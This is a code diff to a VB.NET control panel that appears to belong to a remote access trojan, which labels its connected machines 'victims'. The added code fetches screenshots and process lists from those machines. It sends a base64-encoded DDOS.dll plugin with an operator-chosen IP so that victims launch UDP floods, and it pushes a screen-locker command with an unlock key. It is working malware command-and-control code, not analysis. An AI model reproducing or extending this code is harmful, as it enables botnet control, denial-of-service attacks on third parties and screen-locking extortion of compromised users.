@@ -8,7 +8,7 @@ Imports System.Net.NetworkInformation
 
 Public Class Form1
     Dim MonServeur As TcpListener 'Le serveur
-    Dim LesClients As List(Of TcpClient) 'Les clients TCP
+    Public LesClients As List(Of TcpClient) 'Les clients TCP
     Dim counteur As Integer = 0
 
 
@@ -127,8 +127,61 @@ Public Class Form1
 
                 lk = odd2
                 j.Label1.Text = "Screenshot from victim : " & lk
+
+            ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length > 0 Then
+                Dim h = ListView1.SelectedItems(0).ToString
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+                j.Label1.Text = "Screenshot from victim : " & lk
+
             End If
             j.Show()
+
+        ElseIf RichTextBox1.Text.EndsWith("ThisIISSTASK") Then
+
+            Dim op As String = RichTextBox1.Text.Replace("ThisIISSTASK", "")
+
+
+            IO.File.WriteAllText("Task.txt", op)
+            Dim tsss As String() = IO.File.ReadAllLines("Task.txt")
+
+
+            Dim azd As New TaskForm
+            For Each h In tsss
+                Dim k As String() = Split(h, "////")
+
+                Dim lvi As New ListViewItem(k(0)) 'first column
+
+                lvi.SubItems.Add(k(1)) 'column 2
+
+                lvi.SubItems.Add(k(2))
+
+                azd.ListView1.Items.Add(lvi)
+                'add all in listview
+                '     ListView1.Items.Add(h.ProcessName).SubItems.Add(h.Id)
+
+
+
+            Next
+
+            azd.ListView1.Sorting = SortOrder.Ascending
+
+            Dim hs = ListView1.SelectedItems(0).ToString
+            Dim o As String = hs.ToString.Replace("ListViewItem: ", "")
+            Dim odd As String = o.Replace("{", "")
+            Dim odd2 As String = odd.Replace("}", "")
+            Dim odd3() As String = Split(odd2, ":")
+
+            lk = odd2
+
+
+            azd.Label1.Text = "Tasks from victim : " & lk
+
+            azd.Show()
 
             RichTextBox1.Text = String.Empty
         End If
@@ -470,6 +523,128 @@ Public Class Form1
                 Next
 
             End If
+        End If
+    End Sub
+
+    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
+        CREDITANDINFO.Show()
+    End Sub
+
+    Private Sub UDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UDPToolStripMenuItem.Click
+        If (LesClients.Count > 0) Then
+
+            Dim IP As String = InputBox("Put an IP to DDOS :")
+
+            Dim plug As String = Convert.ToBase64String(IO.File.ReadAllBytes("DDOS.dll"))
+
+            Dim allstr As String = plug & "IPPPPPP" & IP & "ITSTIMETODDOSWITHUDP"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+            For Each h In ListView1.SelectedItems
+                '     MessageBox.Show(h.ToString)
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
+        End If
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        TaskForm.Show()
+    End Sub
+
+    Private Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
+        If (LesClients.Count > 0) Then
+
+
+
+
+
+            Dim allstr As String = "GETMYTASKS"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+            For Each h In ListView1.SelectedItems
+                '     MessageBox.Show(h.ToString)
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
+        End If
+    End Sub
+
+    Private Sub ScreenLockerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenLockerToolStripMenuItem.Click
+        If (LesClients.Count > 0) Then
+
+
+
+            Dim Key As String = InputBox("Put a key to unlock the screen :")
+
+            Dim allstr As String = Key + "@&&&SCR"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+            For Each h In ListView1.SelectedItems
+                '     MessageBox.Show(h.ToString)
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
         End If
     End Sub
 End Class
